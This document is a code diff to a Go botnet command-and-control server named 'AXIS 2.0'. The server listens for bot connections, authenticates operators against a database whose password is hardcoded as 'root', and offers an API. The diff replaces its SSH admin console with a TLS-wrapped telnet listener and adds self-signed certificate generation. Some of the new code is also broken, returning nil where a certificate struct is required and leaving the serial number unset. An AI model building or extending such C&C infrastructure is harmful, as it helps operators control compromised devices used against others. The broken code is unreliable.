@@ -3,6 +3,7 @@ package main
 import (
 	"crypto/rand"
 	"crypto/rsa"
+	"crypto/tls"
 	"crypto/x509"
 	"encoding/pem"
 	"errors"
@@ -11,7 +12,7 @@ import (
 	"os"
 	"time"
 
-	"golang.org/x/crypto/ssh"
+	"crypto/x509/pkix"
 )
 
 // ============================================================================
@@ -23,13 +24,15 @@ const DatabasePass string = "root"
 const DatabaseTable string = "AXIS2"
 
 // C&C Server listen address (0.0.0.0 for all interfaces)
+// This is for BOT connections (unencrypted, internal protocol)
 const CNCListenAddr string = "0.0.0.0:3778"
 
-// SSH Server listen address (set to empty string to disable SSH)
-const SSHListenAddr string = "0.0.0.0:2222"
+// Encrypted Telnet Server listen address (TLS-wrapped telnet for admin access)
+const TelnetTLSListenAddr string = "0.0.0.0:3777"
 
-// SSH Host Key file path (will be auto-generated if not exists)
-const SSHHostKeyPath string = "ssh_host_key"
+// TLS Certificate and Key file paths (will be auto-generated if not exists)
+const TLSCertPath string = "tls_cert.pem"
+const TLSKeyPath string = "tls_key.pem"
 
 // API Server listen address (set to empty string to disable API)
 const APIListenAddr string = "0.0.0.0:3779"
@@ -40,47 +43,46 @@ var clientList *ClientList = NewClientList()
 var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)
 
 func main() {
-	// Start C&C server for bot connections
+	// Start C&C server for bot connections (unencrypted internal protocol)
 	tel, err := net.Listen("tcp", CNCListenAddr)
 	if err != nil {
 		fmt.Printf("Failed to start C&C server: %v\n", err)
 		return
 	}
 
-	// Start SSH server for admin connections
-	if SSHListenAddr != "" {
-		signer, err := getOrCreateSSHHostKey()
+	// Start Encrypted Telnet server for admin connections (TLS-wrapped)
+	if TelnetTLSListenAddr != "" {
+		cert, err := getOrCreateTLSCertificate()
 		if err != nil {
-			fmt.Printf("Failed to load SSH host key: %v\n", err)
+			fmt.Printf("Failed to load TLS certificate: %v\n", err)
 			return
 		}
 
-		sshConfig := &ssh.ServerConfig{
-			PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
-				// Validate credentials against database
-				if database.ValidateCredentials(c.User(), string(pass)) {
-					return &ssh.Permissions{Extensions: map[string]string{"username": c.User()}}, nil
-				}
-				return nil, fmt.Errorf("invalid credentials")
+		tlsConfig := &tls.Config{
+			Certificates: []tls.Certificate{cert},
+			MinVersion:   tls.VersionTLS12, // Only TLS 1.2 and above
+			CipherSuites: []uint16{
+				tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
+				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
+				tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
 			},
 		}
-		sshConfig.AddHostKey(signer)
 
-		sshListener, err := net.Listen("tcp", SSHListenAddr)
+		tlsListener, err := tls.Listen("tcp", TelnetTLSListenAddr, tlsConfig)
 		if err != nil {
-			fmt.Printf("Failed to start SSH server: %v\n", err)
+			fmt.Printf("Failed to start encrypted telnet listener: %v\n", err)
 			return
 		}
 
 		go func() {
-			fmt.Printf("AXIS 2.0 SSH Server listening on %s\n", SSHListenAddr)
+			fmt.Printf("AXIS 2.0 Encrypted Telnet Server (TLS) listening on %s\n", TelnetTLSListenAddr)
 			for {
-				conn, err := sshListener.Accept()
+				conn, err := tlsListener.Accept()
 				if err != nil {
-					fmt.Printf("Failed to accept SSH connection: %v\n", err)
+					fmt.Printf("Failed to accept encrypted telnet connection: %v\n", err)
 					break
 				}
-				go handleSSHConnection(conn, sshConfig)
+				go NewAdmin(conn).Handle()
 			}
 		}()
 	}
@@ -179,80 +181,72 @@ func netshift(prefix uint32, netmask uint8) uint32 {
 	return uint32(prefix >> (32 - netmask))
 }
 
-// getOrCreateSSHHostKey loads or generates an SSH host key
-func getOrCreateSSHHostKey() (ssh.Signer, error) {
-	// Try to read existing key
-	keyBytes, err := os.ReadFile(SSHHostKeyPath)
-	if err == nil {
-		signer, err := ssh.ParsePrivateKey(keyBytes)
+// getOrCreateTLSCertificate loads or generates a TLS certificate
+func getOrCreateTLSCertificate() (tls.Certificate, error) {
+	// Try to read existing certificate and key
+	certBytes, certErr := os.ReadFile(TLSCertPath)
+	keyBytes, keyErr := os.ReadFile(TLSKeyPath)
+
+	if certErr == nil && keyErr == nil {
+		cert, err := tls.X509KeyPair(certBytes, keyBytes)
 		if err == nil {
-			return signer, nil
+			return cert, nil
 		}
 	}
 
-	// Generate new key
-	fmt.Println("Generating new SSH host key...")
+	// Generate new self-signed certificate
+	fmt.Println("Generating new TLS certificate...")
+
+	// Generate private key
 	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
 	if err != nil {
 		return nil, err
 	}
 
-	// Encode to PEM
-	privateKeyPEM := &pem.Block{
+	// Create certificate template
+	template := x509.Certificate{
+		SerialNumber: nil,
+		Subject: pkix.Name{
+			Organization: []string{"AXIS 2.0"},
+			CommonName:   "AXIS 2.0 C&C Server",
+		},
+		NotBefore:             time.Now(),
+		NotAfter:              time.Now().Add(365 * 24 * time.Hour), // Valid for 1 year
+		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
+		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+		BasicConstraintsValid: true,
+	}
+
+	// Create certificate
+	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &privateKey.PublicKey, privateKey)
+	if err != nil {
+		return nil, err
+	}
+
+	// Encode certificate to PEM
+	certPEM := pem.EncodeToMemory(&pem.Block{
+		Type:  "CERTIFICATE",
+		Bytes: certDER,
+	})
+
+	// Encode private key to PEM
+	keyPEM := pem.EncodeToMemory(&pem.Block{
 		Type:  "RSA PRIVATE KEY",
 		Bytes: x509.MarshalPKCS1PrivateKey(privateKey),
-	}
+	})
 
-	// Save to file
-	keyBytes = pem.EncodeToMemory(privateKeyPEM)
-	if err := os.WriteFile(SSHHostKeyPath, keyBytes, 0600); err != nil {
+	// Save certificate
+	if err := os.WriteFile(TLSCertPath, certPEM, 0644); err != nil {
 		return nil, err
 	}
 
-	// Parse and return signer
-	signer, err := ssh.ParsePrivateKey(keyBytes)
-	if err != nil {
+	// Save private key with restricted permissions
+	if err := os.WriteFile(TLSKeyPath, keyPEM, 0600); err != nil {
 		return nil, err
 	}
 
-	return signer, nil
-}
+	fmt.Printf("TLS certificate generated: %s, %s\n", TLSCertPath, TLSKeyPath)
 
-// handleSSHConnection handles SSH admin connections
-func handleSSHConnection(conn net.Conn, sshConfig *ssh.ServerConfig) {
-	// Perform SSH handshake
-	sshConn, chans, reqs, err := ssh.NewServerConn(conn, sshConfig)
-	if err != nil {
-		fmt.Printf("Failed SSH handshake: %v\n", err)
-		conn.Close()
-		return
-	}
-	defer sshConn.Close()
-
-	// Discard global requests
-	go ssh.DiscardRequests(reqs)
-
-	// Accept channels
-	for newChannel := range chans {
-		if newChannel.ChannelType() != "session" {
-			newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
-			continue
-		}
-
-		channel, requests, err := newChannel.Accept()
-		if err != nil {
-			continue
-		}
-
-		go func(channel ssh.Channel, requests <-chan *ssh.Request) {
-			defer channel.Close()
-
-			// Handle session requests
-			go ssh.DiscardRequests(requests)
-
-			// Create admin session
-			admin := NewAdminSSH(channel, sshConn, sshConn.User())
-			admin.Handle()
-		}(channel, requests)
-	}
+	// Load and return certificate
+	return tls.X509KeyPair(certPEM, keyPEM)
 }
